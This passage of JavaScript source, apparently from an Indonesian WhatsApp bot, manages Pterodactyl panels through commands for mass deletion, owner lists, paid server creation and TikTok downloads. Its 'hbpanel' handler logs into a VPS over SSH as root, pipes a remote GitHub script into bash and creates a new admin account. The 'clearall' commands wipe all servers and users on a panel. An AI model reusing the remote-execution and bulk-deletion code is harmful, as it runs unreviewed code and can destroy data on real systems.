 // =======================
 // Proses Hapus Server
 // =======================
 let fServers = await fetch(global.domain + "/api/application/servers", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 let serverRes = await fServers.json();
 let servers = serverRes.data;

 if (!servers || servers.length === 0) {
 m.reply('Tidak ada server yang ditemukan.');
 } else {
 for (let server of servers) {
 let s = server.attributes;

 // Jika server ID ada di daftar pengecualian, lewati
 if (excludedServerIds.includes(s.id.toString())) {
 m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
 continue;
 }

 // Menghapus server
 let deleteServer = await fetch(global.domain + "/api/application/servers/" + s.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 if (deleteServer.ok) {
 m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
 } else {
 let errorText = await deleteServer.text();
 m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
 }
 }
 m.reply('*Proses penghapusan server selesai!*');
 }

 // =======================
 // Proses Hapus Admin
 // =======================
 let fAdmins = await fetch(global.domain + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 let adminRes = await fAdmins.json();
 let users = adminRes.data;

 if (!users || users.length === 0) {
 m.reply('Tidak ada user yang ditemukan.');
 } else {
 for (let user of users) {
 let u = user.attributes;

 // Jika ID admin ada di daftar pengecualian, lewati proses penghapusan
 if (excludedAdminIds.includes(u.id.toString())) {
 m.reply(`*Admin dengan ID ${u.id} (${u.username}) dikecualikan dari penghapusan.*`);
 continue;
 }

 // Menghapus user
 let deleteUser = await fetch(global.domain + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id} (${u.username})*`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 m.reply('*Proses penghapusan admin selesai!*');
 }

 } catch (error) {
 m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;

}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'clearall2': {
 const argsString = body.trim();
 const [serverIdsString, adminIdsString] = argsString.split('|').map(part => part.trim()); // Memisahkan ID server dan ID admin
 const excludedServerIds = serverIdsString.split(',').slice(1).map(id => id.trim()); // ID server yang dikecualikan
 const excludedAdminIds = adminIdsString ? adminIdsString.split(',').map(id => id.trim()) : []; // ID admin yang dikecualikan

 if (excludedServerIds.length === 0 && excludedAdminIds.length === 0) {
 return m.reply('Tolong masukkan ID server dan/atau ID admin yang ingin dikecualikan.\nContoh: .clearall2 ,idserver,idserver,idserver|idadmin,idadmin,idadmin');
 }

 try {
 // =======================
 // Proses Hapus Server
 // =======================
 let fServers = await fetch(global.domain2 + "/api/application/servers", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey2,
 }
 });

 let serverRes = await fServers.json();
 let servers = serverRes.data;

 if (!servers || servers.length === 0) {
 m.reply('Tidak ada server yang ditemukan.');
 } else {
 for (let server of servers) {
 let s = server.attributes;

 if (excludedServerIds.includes(s.id.toString())) {
 m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
 continue;
 }

 let deleteServer = await fetch(global.domain2 + "/api/application/servers/" + s.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey2,
 }
 });

 if (deleteServer.ok) {
 m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
 } else {
 let errorText = await deleteServer.text();
 m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
 }
 }
 m.reply('*Proses penghapusan server selesai!*');
 }

 // =======================
 // Proses Hapus Admin
 // =======================
 let fAdmins = await fetch(global.domain2 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey2,
 }
 });

 let adminRes = await fAdmins.json();
 let users = adminRes.data;

 if (!users || users.length === 0) {
 m.reply('Tidak ada user yang ditemukan.');
 } else {
 for (let user of users) {
 let u = user.attributes;

 if (excludedAdminIds.includes(u.id.toString())) {
 m.reply(`*Admin dengan ID ${u.id} (${u.username}) dikecualikan dari penghapusan.*`);
 continue;
 }

 let deleteUser = await fetch(global.domain2 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey2,
 }
 });

 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id} (${u.username})*`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 m.reply('*Proses penghapusan admin selesai!*');
 }

 } catch (error) {
 m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'clearall3': {
 const argsString = body.trim();
 const [serverIdsString, adminIdsString] = argsString.split('|').map(part => part.trim()); 
 const excludedServerIds = serverIdsString.split(',').slice(1).map(id => id.trim());
 const excludedAdminIds = adminIdsString ? adminIdsString.split(',').map(id => id.trim()) : []; 

 if (excludedServerIds.length === 0 && excludedAdminIds.length === 0) {
 return m.reply('Tolong masukkan ID server dan/atau ID admin yang ingin dikecualikan.\nContoh: .clearall3 ,idserver,idserver,idserver|idadmin,idadmin,idadmin');
 }

 try {
 // =======================
 // Proses Hapus Server
 // =======================
 let fServers = await fetch(global.domain3 + "/api/application/servers", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey3,
 }
 });

 let serverRes = await fServers.json();
 let servers = serverRes.data;

 if (!servers || servers.length === 0) {
 m.reply('Tidak ada server yang ditemukan.');
 } else {
 for (let server of servers) {
 let s = server.attributes;

 if (excludedServerIds.includes(s.id.toString())) {
 m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
 continue;
 }

 let deleteServer = await fetch(global.domain3 + "/api/application/servers/" + s.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey3,
 }
 });

 if (deleteServer.ok) {
 m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
 } else {
 let errorText = await deleteServer.text();
 m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
 }
 }
 m.reply('*Proses penghapusan server selesai!*');
 }

 // =======================
 // Proses Hapus Admin
 // =======================
 let fAdmins = await fetch(global.domain3 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey3,
 }
 });

 let adminRes = await fAdmins.json();
 let users = adminRes.data;

 if (!users || users.length === 0) {
 m.reply('Tidak ada user yang ditemukan.');
 } else {
 for (let user of users) {
 let u = user.attributes;

 if (excludedAdminIds.includes(u.id.toString())) {
 m.reply(`*Admin dengan ID ${u.id} (${u.username}) dikecualikan dari penghapusan.*`);
 continue;
 }

 let deleteUser = await fetch(global.domain3 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey3,
 }
 });

 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id} (${u.username})*`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 m.reply('*Proses penghapusan admin selesai!*');
 }

 } catch (error) {
 m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'addowner':
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner dan Pengguna Premium');
 
 if (!q) return m.reply('⚠️ Masukkan nomor yang ingin ditambahkan sebagai owner.\nContoh: .addowner 6289502445574');
 
 if (global.owner.includes(q)) {
 return m.reply(`❌ Nomor ${q} sudah ada dalam daftar owner.`);
 }
 
 global.owner.push(q);
 
 fs.writeFileSync(settingsPath, `global.owner = ${JSON.stringify(global.owner, null, 2)}\n`);
 
 m.reply(`✅ Nomor ${q} berhasil ditambahkan ke daftar owner.`);
 break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'delowner':
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner dan Pengguna Premium');
 
 if (!q) return m.reply('⚠️ Masukkan nomor yang ingin dihapus dari daftar owner.\nContoh: .delowner 6289502445574');
 
 if (!global.owner.includes(q)) {
 return m.reply(`❌ Nomor ${q} tidak ditemukan dalam daftar owner.`);
 }

 global.owner = global.owner.filter(owner => owner !== q);

 fs.writeFileSync(settingsPath, `global.owner = ${JSON.stringify(global.owner, null, 2)}\n`);

 m.reply(`✅ Nomor ${q} berhasil dihapus dari daftar owner.`);
 break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'listowner':
 if (global.owner.length === 0) return m.reply('📋 Daftar owner kosong.');

 let ownerList = '📋 *Daftar Owner* 📋\n\n';
 global.owner.forEach((num, i) => {
 ownerList += `${i + 1}. ${num}\n`;
 });

 m.reply(ownerList.trim());
 break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'hbpanel': {
 if (!isCreator) return m.reply("Kamu tidak memiliki akses ke perintah ini!");

 // Memisahkan teks input menjadi IP dan password
 let t = text.split('|');
 if (t.length < 2) return m.reply("Contoh penggunaan: hbpanel ipvps|pwvps");

 let ipvps = t[0];
 let passwd = t[1];

 // Generate username dan password baru
 const getRandom = (suffix = '') => Math.floor(Math.random() * 10000) + suffix;
 const newuser = "admin" + getRandom("");
 const newpw = "admin" + getRandom("");

 // Konfigurasi koneksi SSH
 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };

 // Perintah untuk dijalankan
 const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;

 // Membuat instance SSH client
 const ress = new Client();

 ress.on('ready', () => {
 ress.exec(command, (err, stream) => {
 if (err) throw err;

 stream.on('close', async (code, signal) => {
 let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel:*
* *Username:* ${newuser}
* *Password:* ${newpw}
`;
 await cupen.sendMessage(m.chat, { text: teks }, { quoted: m });
 ress.end();
 }).on('data', async (data) => {
 // Output dari terminal
 console.log(data.toString());
 }).stderr.on('data', (data) => {
 // Menangani error saat eksekusi
 console.log("Stderr:", data.toString());
 stream.write("skyzodev\n");
 stream.write("7\n");
 stream.write(`${newuser}\n`);
 stream.write(`${newpw}\n`);
 });
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
 m.reply('Kata sandi atau IP tidak valid!');
 }).connect(connSettings);

 break;
    }
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><>    
case 'buyproduk':
{
 if (!text) return m.reply('Masukkan nama produk yang ingin dibeli, contoh: *#buyproduk Admin Panel*');

 // Cari produk berdasarkan nama dari settings.js
 const produk = produkList.find(p => p.nama.toLowerCase() === text.toLowerCase());
 if (!produk) return m.reply(`Produk *${text}* tidak ditemukan dalam daftar. Silakan cek daftar produk yang tersedia.`);

 const amount = produk.harga;
 const fee = Math.floor(Math.random() * 101); // Biaya acak antara 0 - 100
 const totalAmount = amount + fee;

 try {
 // Membuat QRIS
 const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${totalAmount}&codeqr=${qrisorkut}`)).json();

 const expirationTime = new Date(pay.result.expirationTime);
 const timeLeft = Math.max(0, Math.floor((expirationTime - new Date()) / 60000));
 const currentTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
 const expireTimeJakarta = new Date(currentTime.getTime() + timeLeft * 60000);
 const hours = expireTimeJakarta.getHours().toString().padStart(2, '0');
 const minutes = expireTimeJakarta.getMinutes().toString().padStart(2, '0');
 const formattedTime = `${hours}:${minutes}`;

 const tek = `*DETAIL PEMBELIAN PRODUK*\n\n*Nama Produk:* ${produk.nama}\n*Harga Produk:* Rp. ${amount}\n*Total Bayar:* Rp. ${totalAmount} (termasuk biaya admin Rp. ${fee})\n\nSilahkan scan QRIS di atas sebelum ${formattedTime} WIB untuk menyelesaikan pembayaran.`;
 
 await cupen.sendMessage(m.chat, { image: { url: `${pay.result.qrImageUrl}` }, caption: `${tek}` }, { quoted: m });

 const apiUrl = `https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`;
 let isTransactionComplete = false;
 const maxWaitTime = 5 * 60 * 1000; // Waktu tunggu maksimal 5 menit
 const startTime = new Date().getTime();

 while (!isTransactionComplete && new Date().getTime() - startTime < maxWaitTime) {
 try {
 const response = await fetch(apiUrl);
 const result = await response.json();

 if (result && result.amount && parseInt(result.amount) === totalAmount) {
 isTransactionComplete = true;

 const usersFilePath = 'src/users.json';
 let usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));

 const userNumber = `${m.sender}`;
 let user = usersData.find(user => user.nomer === userNumber);

 if (!user) {
 user = { nomer: userNumber, balance: 0 };
 usersData.push(user);
 await cupen.sendMessage(m.chat, { text: 'Pembayaran Telah Di Terima✅\nBerikut Detail Transaksi Barang Anda' }, { quoted: m });
 }

 fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));

 const notification = `*PEMBAYARAN SELESAI!*\n\n*Nama Produk:* ${produk.nama}\n*Harga Produk:* Rp. ${amount}\n\n*Berikut Barang Anda* :\n${produk.linkGrup}`;
 await cupen.sendMessage(m.chat, { text: notification }, { quoted: m });
 }
 } catch (error) {
 console.error('Error memeriksa status transaksi:', error);
 }

 if (!isTransactionComplete) {
 await new Promise(resolve => setTimeout(resolve, 10000));
 }
 }

 if (!isTransactionComplete) {
 const expiredText = `*WAKTU PEMBAYARAN TELAH HABIS!*\n\nTransaksi Anda telah melebihi batas waktu pembayaran. Silakan coba lagi dengan membuat transaksi baru.`;
 await cupen.sendMessage(m.chat, { text: expiredText }, { quoted: m });
 }

 } catch (error) {
 console.error('Error membuat QRIS atau memeriksa status:', error);
 m.reply('Gagal membuat atau memeriksa pembayaran.');
 }
}
break;

//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'listproduk': {
 let list = '*📦 Daftar Produk Tersedia:*\n\n';
 settings.produkList.forEach((produk, index) => {
 list += `*${index + 1}. ${produk.nama}*\n 💰 Harga: Rp ${produk.harga}\n\n`;
 });
 cupen.sendMessage(m.chat, { text: list }, { quoted: m });
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'upharga': {
 if (!isCreator) return m.reply('❌ *Hanya Creator yang bisa mengubah harga produk!*');
 
 const [namaProduk, hargaBaru] = text.split(',');
 if (!namaProduk || !hargaBaru) return m.reply('❌ *Format salah! Contoh: #upharga Admin Panel,15000*');
 if (isNaN(hargaBaru)) return m.reply('❌ *Harga harus berupa angka!*');

 const produkIndex = settings.produkList.findIndex(produk => produk.nama.toLowerCase() === namaProduk.toLowerCase());
 if (produkIndex === -1) return m.reply(`❌ *Produk dengan nama "${namaProduk}" tidak ditemukan!*`);

 settings.produkList[produkIndex].harga = parseInt(hargaBaru);
 
 const newSettings = `module.exports = ${JSON.stringify(settings, null, 2)}`;
 fs.writeFileSync('./settings.js', newSettings);

 cupen.sendMessage(m.chat, { text: `✅ *Harga produk "${namaProduk}" telah diperbarui menjadi Rp ${hargaBaru}*` }, { quoted: m });
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><>        
case 'addproduk':
{
 if (!isCreator) return m.reply('❌ *Hanya Creator yang dapat menambahkan produk!*');
 
 const [namaProduk, harga, linkGrup] = text.split(',');

 if (!namaProduk || !harga) return m.reply('❌ *Format salah! Contoh: .addproduk Membership Pro,15000*');
 if (isNaN(harga)) return m.reply('❌ *Harga harus berupa angka!*');

 const produkBaru = {
 nama: namaProduk.trim(),
 harga: parseInt(harga),
 linkGrup: linkGrup ? linkGrup.trim() : null
 };

 const produkExist = settings.produkList.find(produk => produk.nama.toLowerCase() === produkBaru.nama.toLowerCase());
 if (produkExist) return m.reply(`❌ *Produk dengan nama "${namaProduk}" sudah ada!*`);

 settings.produkList.push(produkBaru);

 const newSettings = `module.exports = ${JSON.stringify(settings, null, 2)}`;
 fs.writeFileSync('./settings.js', newSettings);

 cupen.sendMessage(m.chat, { text: `✅ *Produk "${namaProduk}" berhasil ditambahkan dengan harga Rp ${harga} dan link grup telah disetel.*` }, { quoted: m });
}
break;

//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'delproduk': {
 if (!isCreator) return m.reply('❌ *Hanya Creator yang dapat menghapus produk!*');
 
 const namaProduk = text.trim();
 if (!namaProduk) return m.reply('❌ *Format salah! Contoh: .delproduk Admin Panel*');

 const produkIndex = settings.produkList.findIndex(produk => produk.nama.toLowerCase() === namaProduk.toLowerCase());
 if (produkIndex === -1) return m.reply(`❌ *Produk dengan nama "${namaProduk}" tidak ditemukan!*`);

 const deletedProduct = settings.produkList.splice(produkIndex, 1);

 const newSettings = `module.exports = ${JSON.stringify(settings, null, 2)}`;
 fs.writeFileSync('./settings.js', newSettings);

 cupen.sendMessage(m.chat, { text: `✅ *Produk "${deletedProduct[0].nama}" berhasil dihapus dari daftar produk!*` }, { quoted: m });
}
break;

case 'tiktok2': {
 if (!text) return m.reply("Masukkan URL TikTok");
 if (!text.startsWith("https://")) return m.reply("Masukkan URL yang valid");

 await tiktokDl(q).then(async (result) => {
 await cupen.sendMessage(m.chat, { react: { text: '🕖', key: m.key } });
 if (!result.status) return m.reply("Error!");
 
 if (result.durations == 0 && result.duration == "0 Seconds") {
 let araara = new Array();
 let urutan = 0;

 for (let a of result.data) {
 let imgsc = await prepareWAMessageMedia({ image: { url: `${a.url}` }}, { upload: cupen.waUploadToServer });
 await araara.push({
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Foto Slide Ke *${urutan += 1}*`, 
 hasMediaAttachment: true,
 ...imgsc
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [{ 
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
 }]
 })
 });
 }

 const msgii = await generateWAMessageFromContent(m.chat, {
 viewOnceMessageV2Extension: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: "*Tiktok Downloader ✅*"
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: araara
 })
 })
 }
 }
 }, { userJid: m.sender, quoted: m });

 await cupen.relayMessage(m.chat, msgii.message, { 
 messageId: msgii.key.id 
 });
 } else {
 let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark");
 await cupen.sendMessage(m.chat, { video: { url: urlVid.url }, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*` }, { quoted: m });
 }
 }).catch(e => console.log(e));

 await cupen.sendMessage(m.chat, { react: { text: '', key: m.key } });
}
break;

case 'addlist': {
 if (!text) return m.reply("Masukkan nama item yang ingin ditambahkan!");
 
 let listData = readList(); // Ambil data dari file
 if (listData.includes(text)) return m.reply("Item sudah ada di dalam list!");
 
 listData.push(text); // Tambahkan item
 writeList(listData); // Simpan kembali ke file
 m.reply(`Berhasil menambahkan *${text}* ke dalam list.`);
 break;
}

case 'dellist': {
 if (!text) return m.reply("Masukkan nama item yang ingin dihapus!");
 
 let listData = readList(); // Ambil data dari file
 if (!listData.includes(text)) return m.reply("Item tidak ditemukan dalam list!");
 
 listData = listData.filter(item => item !== text); // Hapus item
 writeList(listData); // Simpan kembali ke file
 m.reply(`Berhasil menghapus *${text}* dari list.`);
 break;
}

case 'list': {
 let listData = readList(); // Ambil data dari file
 if (listData.length === 0) return m.reply("List kosong!");
 
 let listMessage = "*Daftar List Saat Ini:*\n" + listData.map((item, i) => `*${i + 1}.* ${item}`).join("\n");
 m.reply(listMessage);
 break;
}

case 'addrespon': {
if (!isCreator) return m.reply('Khusus developer')
 if (!text) return m.reply("Masukkan format yang benar: cmd|responnya");
 if (!text.includes("|")) return m.reply("Format salah! Gunakan tanda '|' untuk memisahkan cmd dan responnya.");

 let result = text.split("|");
 if (result.length < 2) return m.reply("Format salah! Pastikan menggunakan format: cmd|responnya");

 const [cmd, respon] = result;
 let res = list.find(e => e.cmd === cmd.toLowerCase());
 if (res) return m.reply(`Cmd respon *${cmd.toLowerCase()}* sudah ada dalam database.`);

 let obj = {
 cmd: cmd.toLowerCase(), 
 respon: respon
 };
 
 list.push(obj);
 fs.writeFileSync("./serverside/list.json", JSON.stringify(list, null, 2));
 m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* ke dalam database.`);
 break;
}

case 'delrespon': {
if (!isCreator) return m.reply('Khusus developer')
 if (!text) return m.reply("Masukkan cmd yang ingin dihapus.\n\nKetik *.listrespon* untuk melihat semua cmd.");
 
 const cmd = text.toLowerCase();
 let res = list.find(e => e.cmd === cmd);
 if (!res) return m.reply(`Cmd respon *${cmd}* tidak ditemukan.\n\nKetik *.listrespon* untuk melihat semua cmd respon.`);
 
 let position = list.indexOf(res);
 await list.splice(position, 1);
 fs.writeFileSync("./serverside/list.json", JSON.stringify(list, null, 2));
 
 m.reply(`Berhasil menghapus cmd respon *${cmd}* dari database.`);
 break;
}

case 'listrespon': {
if (!isCreator) return m.reply('Khusus developer')
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

case 'buyunli': {
  if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const harga = 5000; // Harga paket Unlimited
  try {
    // =======================
    // Generate Username Acak
    // =======================
    const generateRandomUsername = () => {
      const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let randomUsername = '';
      for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
        randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return randomUsername;
    };

    const username = generateRandomUsername(); // Buat username acak
    console.log('Generated Username:', username); // Debugging: Cek username

    // =======================
    // Buat QRIS
    // =======================
    const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${harga}&codeqr=${qrisorkut}`)).json();
    const expirationTime = new Date(pay.result.expirationTime);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* Unlimited Server
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
    let msgQr = await cupen.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: pay.result.transactionId,
      amount: pay.result.amount.toString(),
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].saweria.exp();

    // =======================
    // Cek Pembayaran
    // =======================
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
      await sleep(8000);
      const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
      const req = await resultcek.data;

      if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false;
        await clearInterval(db.users[m.sender].saweria.exp);
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Unlimited Server
        `}, { quoted: db.users[m.sender].saweria.msg });

        // =======================
        // Buat Pengguna
        // =======================
        let email = username + "@gmail.com";
        let password = crypto.randomBytes(4).toString('hex');

        let f = await fetch(global.domain + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: username,
            last_name: "Unlimited",
            language: "en",
            password: password
          })
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        let user = data.attributes;

        // =======================
        // Buat Server
        // =======================
        let f3 = await fetch(global.domain + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey
          },
          body: JSON.stringify({
            name: username,
            description: "Unlimited Server",
            user: user.id,
            egg: 15,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "npm start",
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start"
            },
            limits: {
              memory: 0,
              swap: 0,
              disk: 0,
              io: 500,
              cpu: 0
            },
            feature_limits: {
              databases: 5,
              backups: 3,
              allocations: 1
            },
            deploy: {
              locations: [1],
              dedicated_ip: false,
              port_range: []
            }
          })
        });
        let serverRes = await f3.json();
        if (serverRes.errors) {
          console.error('Server Creation Error:', serverRes.errors);
          return m.reply(JSON.stringify(serverRes.errors[0], null, 2));
        }

        // Kirim informasi server ke pengguna
        let server = serverRes.attributes;
        let teks = `
*Berhasil Membuat Server ✅*

*• ID Server :* ${server.id}
*• Nama :* ${server.name}
*• Username :* ${user.username}
*• Password :* ${password}
*• Login :* ${global.domain}
*• Expired :* 1 Bulan
`;
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
        delete db.users[m.sender].saweria;
      }
    }
  } catch (error) {
    console.error('Error:', error);
    m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
  }
}
break;

case 'buy1gb': {
  if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const harga = 1000;
  try {
    // =======================
    // Generate Username Acak
    // =======================
    const generateRandomUsername = () => {
      const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let randomUsername = '';
      for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
        randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return randomUsername;
    };

    const username = generateRandomUsername(); // Buat username acak
    console.log('Generated Username:', username); // Debugging: Cek username

    // =======================
    // Buat QRIS
    // =======================
    const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${harga}&codeqr=${qrisorkut}`)).json();
    const expirationTime = new Date(pay.result.expirationTime);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* 1Gb Server
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
    let msgQr = await cupen.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: pay.result.transactionId,
      amount: pay.result.amount.toString(),
      exp: function () {
        setTimeout(async () => {
